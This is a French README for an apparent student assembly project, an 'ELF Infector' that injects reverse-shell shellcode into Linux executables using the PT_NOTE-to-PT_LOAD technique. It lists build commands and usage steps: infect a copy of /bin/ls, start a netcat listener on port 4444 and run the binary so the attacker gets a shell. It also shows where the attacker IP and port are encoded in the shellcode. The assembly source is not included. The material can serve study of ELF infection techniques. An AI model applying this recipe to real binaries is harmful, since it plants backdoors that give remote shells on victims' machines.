    - Projet Assembleur — ELF Infector

    L'objectif est d'infecter un binaire ELF via un shellcode qui s'exécute au lancement du programme.

    l'arborescence : 

    ESGIexamAssembleurTJ/
    /parcer.asm qui va analyser le binaire ELF
    / infecteur.asm qui va injecter un shellcode dans un binaire ELF
    / reverseshell.asm c'est le shellcode reverseshell (connexion vers l'attaquant)
    / README.md

    - Compilation

    parcer : 
    nasm -f elf64 parcer.asm -o parcer.o
    ld parcer.o -o parcer

    infecteur :
    nasm -f elf64 infecteur.asm -o infecteur.o
    ld infecteur.o -o infecteur

    reverseshell :
    nasm -f bin reverseshell.asm -o reverseshell.bin

    - Comment ça marche

    L'infecteur applique la technique PT_NOTE -> PT_LOAD :

    1. Trouve un segment PT_NOTE (ignoré à l'exécution)
    2. Le transforme en PT_LOAD exécutable
    3. Le fait pointer vers la fin du fichier (après le dernier LOAD, aligné sur 0x1000)
    4. Redirige e_entry vers ce segment
    5. Neutralise PT_INTERP (sinon ld-linux reprend la main et ignore e_entry)
    6. Append le shellcode à la fin du fichier

    Au lancement du binaire infecté, le kernel saute directement sur le shellcode.

    - Utilisation

    1. Copier le binaire cible (ne jamais infecter l'original) :
       cp /bin/ls ./test_ls

    2. Infecter :
       ./infecteur ./test_ls ./reverseshell.bin

    3. Sur la machine attaquante, écouter :
       nc -lvp 4444

    4. Lancer le binaire infecté :
       ./test_ls

    5. L'attaquant obtient un shell root sur la machine victime.

    - Configuration du shellcode

    Dans reverseshell.asm, l'IP et le port de l'attaquant sont encodés dans :
    mov rbx, 0xc201a8c05c110002

    - c0 a8 01 c2 = 192.168.1.194 (IP attaquant)
    - 11 5c = 4444 (port)
    - 02 00 = AF_INET

    Pour changer d'IP/port, il faut reconstruire la valeur 64 bits.

    - Sources

    - Structure ELF : man 5 elf, /usr/include/elf.h
    - Reverse shell x86-64 : https://www.exploit-db.com/exploits/42485
    - Table des syscalls Linux x86-64 : https://syscalls.mebeim.net